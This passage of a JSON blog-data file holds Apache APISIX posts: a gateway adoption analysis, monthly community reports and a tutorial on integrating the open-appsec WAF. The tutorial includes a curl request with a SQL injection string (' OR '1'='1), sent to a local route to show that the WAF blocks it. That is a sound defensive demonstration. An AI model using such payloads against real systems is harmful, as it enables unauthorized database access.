2025","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":3.07,"truncated":true,"authors":[{"name":"Ming Wen","title":"Author","url":"https://www.linkedin.com/in/ming-wen-api7/","image_url":"https://github.com/moonming.png","imageURL":"https://github.com/moonming.png"},{"name":"Yilia Lin","title":"Technical Writer","url":"https://github.com/Yilialinn","image_url":"https://github.com/Yilialinn.png","imageURL":"https://github.com/Yilialinn.png"}],"prevItem":{"title":"Cloud vs Open Source vs Commercial API Gateways: Which One Fits Your Needs?","permalink":"/blog/2025/02/17/cloud-vs-open-source-vs-commercial-api-gateways"},"nextItem":{"title":"Monthly Report (January 01 - January 26)","permalink":"/blog/2025/01/26/monthly-report"}},"content":"<head>\\n    <link rel=\\"canonical\\" href=\\"https://www.linkedin.com/pulse/analyzing-api-gateway-adoption-rates-through-internet-ming-wen-prync/?trackingId=e7XGKblnQF%2BVlG5FDouG%2Fg%3D%3D\\" />\\n</head>\\n\\n> [Ming Wen](https://www.linkedin.com/in/ming-wen-api7/), Chairman of Apache APISIX, recently posted a blog about [data-driven analysis of API gateway adoption](https://www.linkedin.com/posts/ming-wen-api7_apigateway-kong-apisix-activity-7292899936659021824-7KrU/?utm_source=share&utm_medium=member_desktop) on LinkedIn. The analysis uses two methods: internet-wide scans (FOFA) to identify publicly exposed API gateway instances and company adoption data (BuiltWith) to reveal which businesses are using them.\\n\x3c!--truncate--\x3e\\n\\n## Key Takeaways\\n\\n1. **Internet-wide scans** give us a broad view of API gateway deployment but may be influenced by large-scale deployments from a few organizations.\\n\\n2. **Company-based data** from sources like BuiltWith helps us understand which businesses use specific API gateways, adding context to raw adoption numbers.\\n\\n3. Different API gateways have varying levels of adoption across **industries and regions**, suggesting that market preferences play a role in selection.\\n\\n4. Combining multiple data sources provides a more balanced perspective on API gateway adoption trends.\\n\\n## Introduction\\n\\nAPI gateways play a crucial role in modern software architecture, acting as a control point for routing, security, and performance optimization. With a variety of options available, engineers often consider adoption rates as a key factor when selecting an API gateway. While reports from firms like Gartner and G2 provide valuable insights, they rely on surveys and curated datasets, which may be influenced by vendor-driven narratives. Instead, I wanted to explore a more data-driven, large-sample, and manipulation-resistant method to analyze API gateway adoption rates.\\n\\n## Measuring API Gateway Adoption with Internet-Wide Scans\\n\\nTo find a more objective measure, I turned to internet-wide scanning techniques that reveal API gateways publicly exposed on the internet. Most API gateways are designed to expose services to external consumers, making them discoverable via network scanning tools. I initially explored both FOFA and Shodan as internet search engines but found FOFA\u2019s dataset to be more comprehensive for this analysis.\\n\\nBy querying FOFA for public-facing instances of Kong, Apache APISIX, WSO2, and Traefik as of early February 2025, I obtained the following results:\\n\\n![Nodes using Kong API Gateway](https://static.apiseven.com/uploads/2025/02/06/FTPivIkZ_nodes-using-kong-api-gateway.png)\\n\\n![Nodes using APISIX API Gateway](https://static.apiseven.com/uploads/2025/02/06/DTRZsW0F_nodes-using-apisix-api-gateway.png)\\n\\n![Nodes using of WSO2 API Gateway](https://static.apiseven.com/uploads/2025/02/06/0TZnI0iW_nodes-using-wso2-api-gateway.png)\\n\\n![Nodes using Traefik API Gateway](https://static.apiseven.com/uploads/2025/02/06/UujJSm8z_nodes-using-traefik-api-gateway.png)\\n\\nAs of early February 2025, Kong API Gateway had **345,000** deployments, Apache APISIX had **147,000**, while WSO2 and Traefik had **14,000** and **2,700**, respectively.\\n\\nThese results provide a broad sample size and offer a high-level perspective on API gateway adoption. However, there are potential biases: a single organization deploying thousands of nodes could skew the data, and this method does not reveal which companies are using a particular API gateway. If smaller companies dominate the dataset, the practical implications for enterprise adoption may be limited.\\n\\n## A Different Perspective: Identifying API Gateway Usage by Companies\\n\\nTo complement the internet-wide scan, I analyzed API gateway adoption from a company-centric perspective using BuiltWith, a service that tracks technology adoption across websites. BuiltWith allows us to see which companies use specific API gateways rather than just counting exposed nodes. I searched for Kong, Apache APISIX, and KrakenD but could not find data on other API gateways. If anyone has insights into other sources, I\u2019d be happy to update this analysis.\\n\\nHere are the BuiltWith results:\\n\\n![Websites using Kong API Gateway](https://static.apiseven.com/uploads/2025/02/06/hxhkPZsj_websites-using-kong-api-gateway.png)\\n\\n![Websites using APISIX API Gateway](https://static.apiseven.com/uploads/2025/02/06/wnSMOa8f_websites-using-apisix-api-gateway.png)\\n\\n![Websites using KrakenD API Gateway](https://static.apiseven.com/uploads/2025/02/06/pwC3zOJa_websites-using-krakend-api-gateway.png)\\n\\nBased on BuiltWith data, in early February 2025, **37,000** companies were using Kong API Gateway, **5,200** companies were using Apache APISIX, and **2,000** companies were using KrakenD.\\n\\nMost companies using **Kong** are based in the **United States**, **KrakenD** is primarily adopted in **Europe**, while **Apache APISIX** has adopters distributed across **the United States and China**.\\n\\nThese results provide a different view\u2014one that highlights enterprise adoption trends across different regions and industries. By examining this data, we can infer not just overall adoption but also sector-specific preferences for API gateways."},{"id":"Monthly Report (January 01 - January 26)","metadata":{"permalink":"/blog/2025/01/26/monthly-report","source":"@site/blog/2025/01/26/monthly-report.md","title":"Monthly Report (January 01 - January 26)","description":"Our monthly Apache APISIX community report generates insights into the project\'s monthly developments. The reports provide a pathway into the Apache APISIX community, ensuring that you stay well-informed and actively involved.","date":"2025-01-26T00:00:00.000Z","formattedDate":"January 26, 2025","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":1.025,"truncated":true,"authors":[],"prevItem":{"title":"Analyzing API Gateway Adoption Rates Through Internet Data","permalink":"/blog/2025/02/06/analyzing-api-gateway-adoption-rates"},"nextItem":{"title":"Monthly Report (December 01 - December 31)","permalink":"/blog/2024/12/31/monthly-report"}},"content":"> We have recently added a new feature within Apache APISIX, which supports anonymous consumers in authentication. For detailed information, please read the monthly report.\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nFrom its inception, the Apache APISIX project has embraced the ethos of open-source community collaboration, propelling it into the ranks of the most active global open-source API gateway projects. The proverbial wisdom of \'teamwork makes the dream work\' rings true in our way and is made possible by the collective effort of our community.\\n\\nFrom January 1 to January 26, 5 contributors made 17 commits to Apache APISIX. We sincerely appreciate your contributions to Apache APISIX.\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.apiseven.com/uploads/2025/01/26/REIh62gM_contributors-jan.png)\\n\\n## Recent Feature Highlight\\n\\n[Support Anonymous Consumer in Authentication](https://github.com/apache/apisix/pull/11917) (Contributor: [Revolyssup](https://github.com/Revolyssup))\\n\\nThe anonymous consumer feature enables selective bypass of authentication requirements by allowing the configuration of an anonymous consumer on authentication plugins. This feature allows protected routes to grant access to non-authenticated callers.\\n\\n## Conclusion\\n\\nThe [official website](https://apisix.apache.org/) and [GitHub Issues](https://github.com/apache/apisix/issues) of Apache APISIX provide a wealth of documentation of tutorials and real-world use cases. If you encounter any issues, you can refer to the documentation, search for keywords in Issues, or participate in discussions on Issues to share your ideas and practical experiences."},{"id":"Monthly Report (December 01 - December 31)","metadata":{"permalink":"/blog/2024/12/31/monthly-report","source":"@site/blog/2024/12/31/monthly-report.md","title":"Monthly Report (December 01 - December 31)","description":"Our monthly Apache APISIX community report generates insights into the project\'s monthly developments. The reports provide a pathway into the Apache APISIX community, ensuring that you stay well-informed and actively involved.","date":"2024-12-31T00:00:00.000Z","formattedDate":"December 31, 2024","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":1.62,"truncated":true,"authors":[],"prevItem":{"title":"Monthly Report (January 01 - January 26)","permalink":"/blog/2025/01/26/monthly-report"},"nextItem":{"title":"Bi-Monthly Report (October 01 - November 30)","permalink":"/blog/2024/11/30/bi-monthly-report"}},"content":"> We have recently made some additions and improvements to specific features within Apache APISIX. The main improvements include the addition of supporting configuring response headers when using the `limit-count` plugin and supporting \\"system\\" `ssl_trusted_certificate`, among other enhancements. For detailed information, please read the monthly report.\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nFrom its inception, the Apache APISIX project has embraced the ethos of open-source community collaboration, propelling it into the ranks of the most active global open-source API gateway projects. The proverbial wisdom of \'teamwork makes the dream work\' rings true in our way and is made possible by the collective effort of our community.\\n\\nFrom December 1 to December 31, 11 contributors made 27 commits to Apache APISIX. We sincerely appreciate your contributions to Apache APISIX.\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.apiseven.com/uploads/2024/12/31/npwFTjZH_dec-monthly-report-en.png)\\n\\n![Apache APISIX New Contributors](https://static.apiseven.com/uploads/2024/12/31/SDOtuLWf_dec-new-contributors.jpg)\\n\\n## Recent Feature Highlights/Improvements\\n\\n1. [Make Rate-Limiting Response Headers Configurable in `limit-count` Plugin](https://github.com/apache/apisix/pull/11831) (Contributor: [shreemaan-abhishek](https://github.com/shreemaan-abhishek))\\n\\nThis PR allows users to configure the names of rate-limiting response headers using plugin metadata when using the `limit-count` plugin.\\n\\n2. [Support the Configuration of `system` in `ssl_trusted_certificate`](https://github.com/apache/apisix/pull/11809) (Contributor: [Revolyssup](https://github.com/Revolyssup))\\n\\nWith this feature, users can set `system` as the value when configuring `ssl_trusted_certificate`, to use the system-defined CA certificated.\\n\\n3. [Refactor `workflow` Plugin Registration](https://github.com/apache/apisix/pull/11832) (Contributor: [Revolyssup](https://github.com/Revolyssup))\\n\\nCurrent logic requires the table `supported_actions` defined in `workflow.lua` to be changed when any new plugin is added to the `workflow` plugin. With this change, the registration in the table is offloaded to the newly added plugin by implementing the function `workflow_handler()`.\\n\\n4. [Allow Workflow Configuration without `case`](https://github.com/apache/apisix/pull/11787) (Contributor: [Revolyssup](https://github.com/Revolyssup))\\n\\nThis change makes `case` a non-required field and an absence of `case` will be deemed a default match.\\n\\nThe [official website](https://apisix.apache.org/) and [GitHub Issues](https://github.com/apache/apisix/issues) of Apache APISIX provide a wealth of documentation of tutorials and real-world use cases. If you encounter any issues, you can refer to the documentation, search for keywords in Issues, or participate in discussions on Issues to share your ideas and practical experiences."},{"id":"Bi-Monthly Report (October 01 - November 30)","metadata":{"permalink":"/blog/2024/11/30/bi-monthly-report","source":"@site/blog/2024/11/30/bi-monthly-report.md","title":"Bi-Monthly Report (October 01 - November 30)","description":"Our monthly Apache APISIX community report generates insights into the project\'s monthly developments. The reports provide a pathway into the Apache APISIX community, ensuring that you stay well-informed and actively involved.","date":"2024-11-30T00:00:00.000Z","formattedDate":"November 30, 2024","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":2.18,"truncated":true,"authors":[],"prevItem":{"title":"Monthly Report (December 01 - December 31)","permalink":"/blog/2024/12/31/monthly-report"},"nextItem":{"title":"Announcing Integration between Apache APISIX and open-appsec WAF","permalink":"/blog/2024/10/22/apisix-integrates-with-open-appsec"}},"content":"> We have recently made some additions and improvements to specific features within Apache APISIX. The main improvements include the addition of `ai-content-moderation` and `ai-rag` plugins, and a total request panel in the Grafana dashboard among other enhancements. For detailed information, please read the bi-monthly report.\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nFrom its inception, the Apache APISIX project has embraced the ethos of open-source community collaboration, propelling it into the ranks of the most active global open-source API gateway projects. The proverbial wisdom of \'teamwork makes the dream work\' rings true in our way and is made possible by the collective effort of our community.\\n\\nFrom October 1 to November 30, 9 contributors made 29 commits to Apache APISIX. We sincerely appreciate your contributions to Apache APISIX.\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.apiseven.com/uploads/2024/11/29/7z0d7q0r_contributors-nov.png)\\n\\n![Apache APISIX New Contributors](https://static.apiseven.com/uploads/2024/11/29/WZfXkBqp_nov-new-contributors.png)\\n\\n## Recent Feature Highlights\\n\\n1. [Refactor `google-cloud-logging` Plugin](https://github.com/apache/apisix/pull/11596) (Contributor: [HuanXin-Chen](https://github.com/HuanXin-Chen))\\n\\nThis PR changed `scope` into `scopes` according to OAuth2/OIDC rules. It also replaced `google-cloud-logging/oauth.lua` with `utils/google-cloud-oauth.lua`.\\n\\n2. [Add `ai-content-moderation` Plugin](https://github.com/apache/apisix/pull/11541) (Contributor: [shreemaan-abhishek](https://github.com/shreemaan-abhishek))\\n\\nThe `ai-prompt-decorator` plugin simplifies access to LLM providers, such as OpenAI and Anthropic, and their models by appending or prepending prompts into the request.\\n\\n3. [Add `ai-rag` Plugin](https://github.com/apache/apisix/pull/11568)\uff08Contributor: [shreemaan-abhishek](https://github.com/shreemaan-abhishek))\\n\\nImplement the `ai-rag` plugin that uses RAG (Retrieval Augmented Generation), to return information about untrained events/facts from LLMs.\\n\\n4. [Add Total Request Panel in Grafana Dashboard](https://github.com/apache/apisix/pull/11692) (Contributor: [Revolyssup](https://github.com/Revolyssup))\\n\\nAs the Grafana dashboard only has panels for RPS per status code and RPS per service/route, this PR also adds a total RPS panel for the overview of RPS changes.\\n\\n5. [Use `setmetatable` to Set Hidden Variables without Effecting Serialisation in `body-transformer` Plugin](https://github.com/apache/apisix/pull/11770) (Contributor: [Revolyssup](https://github.com/Revolyssup))\\n\\nUsers hope to directly use the decoded body in the template of `body-transformer` plugin, modify its fields, and then encode it again.\\n\\n6. [Support configuring `key_claim_name` in `jwt-auth` Plugin](https://github.com/apache/apisix/pull/11772) (Contributor: [shreemaan-abhishek](https://github.com/shreemaan-abhishek))\\n\\nConfiguring `key_claim_name` in the JWT plugin is essential for specifying which claim in the JWT contains the key that identifies the secret used for validating the token.\\n\\n7. [Suppress Error Log in Multi-Authentication When One Authentication Succeeds](https://github.com/apache/apisix/pull/11775) (Contributor: [shreemaan-abhishek](https://github.com/shreemaan-abhishek))\\n\\nWhen using multiple authentication plugins, even if one authentication plugin passes verification while others fail, an error log is still recorded, which can confuse the user. This PR fixes the logic so that if any one of the authentication plugins passes, no error log will be recorded.\\n\\nThe [official website](https://apisix.apache.org/) and [GitHub Issues](https://github.com/apache/apisix/issues) of Apache APISIX provide a wealth of documentation of tutorials and real-world use cases. If you encounter any issues, you can refer to the documentation, search for keywords in Issues, or participate in discussions on Issues to share your ideas and practical experiences."},{"id":"Announcing Integration between Apache APISIX and open-appsec WAF","metadata":{"permalink":"/blog/2024/10/22/apisix-integrates-with-open-appsec","source":"@site/blog/2024/10/22/apisix-integrates-with-open-appsec.md","title":"Announcing Integration between Apache APISIX and open-appsec WAF","description":"Let\'s protect your web APIs and applications exposed by Apache APISIX against known and unknown attacks with open-appsec - the automatic, machine learning-based WAF.","date":"2024-10-22T00:00:00.000Z","formattedDate":"October 22, 2024","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":12.91,"truncated":true,"authors":[{"name":"Christopher Lutat","title":"Author","url":"https://github.com/ByteSkater","image_url":"https://github.com/ByteSkater.png","imageURL":"https://github.com/ByteSkater.png"},{"name":"Yilia Lin","title":"Technical Writer","url":"https://github.com/Yilialinn","image_url":"https://github.com/Yilialinn.png","imageURL":"https://github.com/Yilialinn.png"}],"prevItem":{"title":"Bi-Monthly Report (October 01 - November 30)","permalink":"/blog/2024/11/30/bi-monthly-report"},"nextItem":{"title":"Release Apache APISIX 3.11.0","permalink":"/blog/2024/10/17/release-apache-apisix-3.11.0"}},"content":"> We are excited to announce a new integration between Apache APISIX and open-appsec WAF, combining the power of a dynamic API gateway with cutting-edge application security.\\n\\n\x3c!--truncate--\x3e\\n\\n<head>\\n    <link rel=\\"canonical\\" href=\\"https://www.openappsec.io/post/announcing-open-appsec-WAF-integration-with-Apache-APISIX-API-Gateway\\" />\\n</head>\\n\\n## Introduction\\n\\nopen-appsec WAF is excited to announce a new integration with the open-source API gateway Apache APISIX.\\n\\nThis new collaboration between the open-appsec and API7 teams now allows users to protect their web APIs and other web services exposed by Apache APISIX against unknown and known attack types effectively based on open-appsec\'s advanced machine-learning-based technology and also adds several more enhanced security capabilities.\\n\\n### About Apache APISIX\\n\\n[Apache APISIX](https://apisix.apache.org/) is a modern, flexible, and high-performance open-source API gateway solution designed to handle various use cases in microservices and cloud-native architectures. Its primary purpose is to facilitate API management by serving as a gateway for managing, securing, and optimizing API traffic between clients and backend services.\\n\\nFurther use cases for APISIX as an API gateway include load balancing, rate limiting, authentication, and authorization. It provides comprehensive features such as traffic control, dynamic upstream, and plugin extensibility, enabling developers to customize and extend functionality according to their specific needs.\\n\\n- Website: [apisix.apache.org](https://apisix.apache.org)\\n\\n- Github: [github.com/apache/apisix](https://github.com/apache/apisix)\\n\\n- Docs: [apisix.apache.org/docs](https://apisix.apache.org/docs)\\n\\n### About open-appsec WAF\\n\\n[open-appsec WAF](https://www.openappsec.io) provides automatic, preemptive threat prevention and integrates with various types of reverse proxies like NGINX as well as API gateways like APISIX. It is machine-learning-based, meaning it doesn\'t require signatures (or updates) at all. This enables it to provide automatic, state-of-the-art threat prevention even for true zero-day attacks while significantly reducing both administrative effort and the amount of false positives.\\n\\nIn addition, open-appsec provides many additional security layers such as AntiBot, rate limiting, schema enforcement, snort signature support, custom rules/exceptions, and more. open-appsec can be managed centrally using a Web UI provided as a SaaS service and also locally using a declarative configuration file.\\n\\n- Website: [www.openappsec.io](https://www.openappsec.io)\\n\\n- Github: [github.com/openappsec](https://github.com/openappsec)\\n\\n- Docs: [docs.openappsec.io](https://docs.openappsec.io)\\n\\n- Playgrounds: [www.openappsec.io/playground](https://www.openappsec.io/playground)\\n\\n## Integrating Apache APISIX with open-appsec\\n\\nWith this new integration, APISIX users will now have access to open-appsec WAF as an integrated, state-of-the-art machine-learning-based WAF solution for the protection of their web APIs and web applications.\\n\\nThey can now use e.g. open-appsec\'s free and open-source \\"Community Edition\\" to get effective, AI-based protection against known but also unknown attacks for everything exposed by their APISIX API gateway, while at the same time reducing the amount of false positives significantly unburdening the administrator from tedious tasks such as creating exceptions, updating traditional signature-based policies and more.\\n\\nThis integration will be available for all common platforms: Linux, Docker, and Kubernetes.\\n\\n### Linux\\n\\n**For Linux \\"embedded\\" deployments** of APISIX, an open-appsec installer will add an \\"open-appsec attachment\\" module to the existing APISIX installation and also install the \\"open-appsec agent\\" alongside it, which will receive the traffic from the attachment, inspect it, and return the concluded action to block or allow the traffic back to the APISIX respectively the open-appsec attachment integrated with it.\\n\\nHere\'s a simple architecture schematic for Linux deployment.\\n\\n![Architecture for Linus Deployment](https://static.apiseven.com/uploads/2024/10/18/6QZvRy6P_linux-deployment.png)\\n\\n### Docker\\n\\n**For Docker-based deployments** of APISIX with open-appsec WAF, there is a special APISIX container image available, to which the open-appsec attachment was already added and also an enhanced docker-compose file, which deploys both, the APISIX gateway container as well as an open-appsec Agent that does the security inspection and returns the concluded decisions to the APISIX gateway to allow or block traffic.\\n\\nHere\'s a simple architecture schematic for deployment on Docker.\\n\\n![Architecture for Docker-Based Deployment](https://static.apiseven.com/uploads/2024/10/18/bxKsXOqW_docker-deployment.png)\\n\\n### Kubernetes\\n\\n**For Kubernetes based-deployments** of APISIX integrated with open-appsec, there\'s a Helm chart available, which is based on the official APISIX Helm chart and further enhanced to also include the open-appsec attachment in the APISIX gateway container and also deploys the open-appsec agent. Further, you will have the option to configure open-appsec in a declarative \\"DevOps-style\\" way using custom resources in K8s as an alternative to using the open-appsec central management Web UI.\\n\\nHere\'s a simple architecture schematic for deployment on Kubernetes.\\n\\n![Architecture for Kubernetes Deployment](https://static.apiseven.com/uploads/2024/10/18/SEZQ6E14_k8s-deployment.png)\\n\\n## Adding open-appsec WAF to APISIX on Linux\\n\\nTo install open-appsec on a Linux system with APISIX installed, please follow these steps:\\n\\n### 1. Prerequisites\\n\\n- The Linux platform must be Ubuntu 22.04.\\n- Make sure to have APISIX installed.\\n\\nYou can find the list of supported APISIX versions here: [https://downloads.openappsec.io/packages/supported-apisix.txt](https://downloads.openappsec.io/packages/supported-apisix.txt).\\n\\nIf you don\'t have APISIX installed yet, you can use the following commands to perform an APISIX installation in \\"traditional mode\\". By running these commands you will first install the etcd database for APISIX, then add the required repos before installing and starting APISIX.\\n\\n**Install etcd Database**\\n\\n```json\\nETCD_VERSION=\'3.5.4\'\\nwget https://github.com/etcd-io/etcd/releases/download/v${ETCD_VERSION}/etcd-v${ETCD_VERSION}-linux-amd64.tar.gz\\ntar -xvf etcd-v${ETCD_VERSION}-linux-amd64.tar.gz && cd etcd-v${ETCD_VERSION}-linux-amd64\\ncp -a etcd etcdctl /usr/bin/\\nnohup etcd >/tmp/etcd.log 2>&1 &\\netcd\\n```\\n\\n**Add and Update Package Repositories**\\n\\n```json\\napt install gnupg\\necho \\"deb http://openresty.org/package/debian bullseye openresty\\" | tee /etc/apt/sources.list.d/openresty.list\\nwget -O - https://openresty.org/package/pubkey.gpg | apt-key add -\\nwget -O - http://repos.apiseven.com/pubkey.gpg | apt-key add -\\necho \\"deb http://repos.apiseven.com/packages/debian bullseye main\\" | tee /etc/apt/sources.list.d/apisix.list\\napt update\\n```\\n\\n**Install, Initiate, and Start APISIX**\\n\\n```json\\napt install apisix=3.9.1-0\\napisix init\\napisix start\\n```\\n\\n### 2. Download the open-appsec Installer\\n\\n```json\\nwget https://downloads.openappsec.io/open-appsec-install && chmod +x open-appsec-install\\n```\\n\\n### 3. Install open-appsec\\n\\nInstall open-appsec to integrate with the existing APISIX installation.\\n\\n> Note that the `--prevent` flag will install open-appsec with a default policy already set to prevent mode.\\n\\n```shell\\n./open-appsec-install --auto --prevent\\n```\\n\\n### 4. Get and Store APISIX Admin Key\\n\\nGet the APISIX admin key from the APISIX `config.yaml` configuration file and store it in the `APISIX_KEY` env variable.\\n\\n```shell\\nexport APISIX_KEY=$(awk \'/key:/{ if ($2 ~ /^edd1/) print $2 }\' /usr/local/apisix/conf/config.yaml )\\n```\\n\\n### 5. Configure Route to Expose Services\\n\\nConfigure an example route in the APISIX gateway to expose an external web service or web API. In this example, we use `httpbin.org` as the example backend.\\n\\n```json\\ncurl http://127.0.0.1:9180/apisix/admin/routes/100 -H \\"X-API-KEY:$APISIX_KEY\\" -X PUT -d \'{\\n    \\"methods\\": [\\n      \\"GET\\"\\n    ],\\n    \\"uri\\": \\"/anything\\",\\n    \\"upstream\\": {\\n      \\"type\\": \\"roundrobin\\",\\n      \\"nodes\\": {\\n        \\"httpbin.org:80\\": 1\\n      }\\n    }\\n  }\'\\n```\\n\\n### 6. Validate\\n\\nLet\'s see if this route works by accessing it.\\n\\n```json\\ncurl -s -v -G --data-urlencode email=user@domain.abc http://localhost:9080/anything\\n```\\n\\n### 7. Simulate an SQL Injection Attack\\n\\nNow let\'s try to simulate an SQL injection attack (see `\'OR \'1\'=\'1\'` in the below HTTP request) against the `httpbin.org` service exposed by the APISIX gateway which is now protected by the open-appsec WAF.\\n\\n```json\\ncurl -s -v -G --data-urlencode email=user@domain.abc\' OR \'1\'=\'1 http://localhost:9080/anything\\n```\\n\\nThis simulated attack now gets blocked successfully by open-appsec\'s contextual machine-learning WAF engine.\\n\\n### 8. Review Log Files\\n\\nCheck out the corresponding log files showing the \\"prevent\\" for the HTTP request with the simulated attack that we just sent.\\n\\n```shell\\ntail -f /var/log/nano_agent/cp-nano-http-transaction-handler.log*| grep -i user@domain.abc\\n```\\n\\nAlternatively you can use the `open-appsec-ctl` tool:\\n\\n```shell\\nopen-appsec-ctl --view-logs | grep -i user@domain.abc\\n```\\n\\n### 9. Connect to open-appsec for Central Management (Optional)\\n\\nOptionally you can connect your deployment now to [https://my.openappsec.io](https://my.openappsec.io) for centrally managing open-appsec with an easy-to-use Web UI, monitoring security events and more, see section **How to Manage Your open-appsec WAF Deployment Centrally?** further below for more information.\\n\\n**Congratulations!** You successfully added open-appsec WAF to your existing APISIX installation and verified that your web services exposed by the APISIX gateway are now protected against web attacks.\\n\\n## Deploying APISIX with open-appsec WAF on Containerized Platforms (Docker)\\n\\nTo install APISIX integrated with open-appsec on Docker, you can follow the steps shown below.\\n\\nOpposite to the above example here we are deploying APISIX in \\"standalone mode\\", which means it\'s declaratively configured using a docker volume mount with a yaml file that holds the configurations and therefore won\'t require an etcd database deployment.\\n\\n> Note that APISIX supports both, traditional as well as standalone modes in all deployment types (Linux, Docker, \u2026)\\n\\n### 1. Prerequisite\\n\\nMake sure to have a Linux platform with both Docker and docker-compose tools installed.\\n\\n### 2. Create a Folder for open-appsec\\n\\nWithin the directory that you want to use for the deployment, create a folder `appsec-localconfig` which will hold the appsec declarative configuration file:\\n\\n```json\\nmkdir ./appsec-localconfig\\n```\\n\\n### 3. Download the open-appsec File into the Folder\\n\\nDownload the initial declarative configuration file for open-appsec into that folder.\\n\\n```json\\nwget https://raw.githubusercontent.com/openappsec/openappsec/main/config/linux/latest/prevent/local_policy.yaml -O appsec-localconfig/local_policy.yaml\\n```\\n\\n> Note that this example declarative configuration file is already set to prevent attacks.\\n\\n### 4. Create a Folder for APISIX\\n\\nCreate another folder `apisix-localconfig` which will hold the declarative configuration file for APISIX: `mkdir ./apisix-localconfig`.\\n\\n### 5. Download APISIX File into the Folder\\n\\nLet\'s download a simple declarative configuration file also for APISIX so we can verify open-appsec protection after the deployment.\\n\\n```json\\nwget https://raw.githubusercontent.com/openappsec/openappsec/main/deployment/apisix/apisix-example-config/apisix-standalone.yaml -O ./apisix-localconfig/apisix-standalone.yaml\\n```\\n\\n### 6. Create a `docer-compose.yaml` File\\n\\nCreate a `docker-compose.yaml` file with the content below, which can be downloaded as follows:\\n\\n```json\\nwget https://raw.githubusercontent.com/openappsec/openappsec/main/deployment/apisix/docker-compose.yaml\\n```\\n\\n```json\\nversion: \\"3\\"\\n\\nservices:\\n  apisix:\\n    container_name: apisix\\n    image: \\"ghcr.io/openappsec/apisix-attachment:latest\\"\\n    ipc: service:appsec-agent\\n    restart: always\\n    volumes:\\n      - ./apisix-localconfig/apisix-standalone.yaml:/usr/local/apisix/conf/apisix.yaml:ro\\n    environment:\\n      - APISIX_STAND_ALONE=true\\n    ports:\\n      - \\"9180:9180/tcp\\"\\n      - \\"9080:9080/tcp\\"\\n      - \\"9091:9091/tcp\\"\\n      - \\"9443:9443/tcp\\"\\n\\n  appsec-agent:\\n    container_name: appsec-agent\\n    image: \'ghcr.io/openappsec/agent:latest\'\\n    ipc: shareable\\n    restart: unless-stopped\\n    environment:\\n      # adjust with your own email below\\n      - user_email=user@email.com\\n      - registered_server=\\"APISIX Server\\"\\n    volumes:\\n      - ./appsec-config:/etc/cp/conf\\n      - ./appsec-data:/etc/cp/data\\n      - ./appsec-logs:/var/log/nano_agent\\n      - ./appsec-localconfig:/ext/appsec\\n    command: /cp-nano-agent\\n```\\n\\n### 7. Update Your Email Address (Optional)\\n\\nEdit the `docker-compose.yaml` file and replace \\"user@email.com\\" with your own email address, so we can provide assistance in case of any issues with the specific deployment in the future and provide information proactively regarding open-appsec.\\n\\nThis is an optional parameter and can be removed. If we send automatic emails, there will also be an opt-out option included for receiving similar communication in the future.\\n\\n### 8. Start All Containers\\n\\nRun docker-compose up to start the deployment of all relevant containers:\\n\\n```shell\\ndocker-compose up -d\\n```\\n\\n### 9. Check Container Status\\n\\nCheck if the `apisix-attachment` and the `appsec-agent` containers are up and running.\\n\\n```shell\\ndocker ps\\n```\\n\\n### 10. Validate the Standalone Configuration\\n\\nLet\'s see if the standalone configuration works by accessing it.\\n\\n```json\\ncurl -s -v -G --data-urlencode email=user@domain.abc http://localhost:9080/anything\\n```\\n\\n### 11. Simulate an SQL Injection Attack\\n\\nNow let\'s try to simulate an SQL injection attack against the httpin.org service exposed by the APISIX gateway container which is now protected by open-appsec.\\n\\n```json\\ncurl -s -v -G --data-urlencode email=user@domain.abc\' OR \'1\'=\'1 http://localhost:9080/anything\\n```\\n\\n### 12. Connect to open-appsec for Central Management (Optional)\\n\\nOptionally you can connect your deployment now to `https://my.openappsec.io` for centrally managing open-appsec with an easy-to-use Web UI, monitoring security events, and more, see section **How to Manage Your open-appsec WAF Deployment Centrally?** further below for more information.\\n\\n## Deploying APISIX with open-appsec WAF on Kubernetes Using Helm\\n\\n### 1. Prerequisite\\n\\nMake sure the Kubernetes platform and Helm tool are available.\\n\\n### 2. Download open-appsec\\n\\nDownload the open-appsec for the APISIX Helm chart here.\\n\\n```json\\nwget https://downloads.openappsec.io/packages/helm-charts/apisix/open-appsec-k8s-apisix-latest.tgz\\n```\\n\\n### 3. Install Helm Chart\\n\\nThis example `helm install` command is installing the open-appsec for the APISIX Helm chart which is based on an extended version of the official APISIX Helm chart.\\n\\nIt will deploy the APISIX gateway as the APISIX Ingress Controller, as well as open-appsec WAF integrated with it. It also offers an additional configuration option specifically for open-appsec WAF (see `values.yaml` inside the Helm chart and open-appsec [docs](https://docs.openappsec.io/)).\\n\\nAfter deployment, you can assign your K8s ingress resources to the APISIX gateway by configuring them to use the following ingress class: `appsec-apisix`.\\n\\n```shell\\nhelm install open-appsec-k8s-apisix-latest.tgz \\\\\\n--name-template=appsec-apisix \\\\\\n--set rbac.create=true \\\\\\n--set appsec.mode=standalone \\\\\\n--set service.type=LoadBalancer \\\\\\n--set appsec.persistence.enabled=false \\\\\\n--set ingress-controller.enabled=true \\\\\\n--set ingress-controller.config.ingressClass=appsec-apisix \\\\\\n--set appsec.userEmail=\u201d<your-email-address>\u201d \\\\\\n--set appsec.agentToken= \\\\\\n--create-namespace \\\\\\n-n appsec-apisix\\n```\\n\\n> Replace `<your-email-address>` in the Helm install command above with your own email address, so we can send you news and updates related to open-appsec and better support you with your deployment if needed! You can unsubscribe at any time or alternatively, just remove that line if you prefer not to provide your email.\\n\\n### 4. Validate\\n\\nValidate that pods were properly deployed and are in a ready state:\\n\\n```shell\\nkubectl get pods -n appsec-apisix\\n```\\n\\n### 5. Create an open-appsec Policy Resource\\n\\nRun the following command to create the \\"open-appsec-best-practice-policy\\" in K8s.\\n\\n> Note that this example policy is already pre-configured to prevent attacks.\\n\\n```json\\nkubectl apply -f https://raw.githubusercontent.com/openappsec/openappsec/main/config/k8s/v1beta1/open-appsec-k8s-prevent-config-v1beta1.yaml\\n```\\n\\nYou can also create your own custom policy, 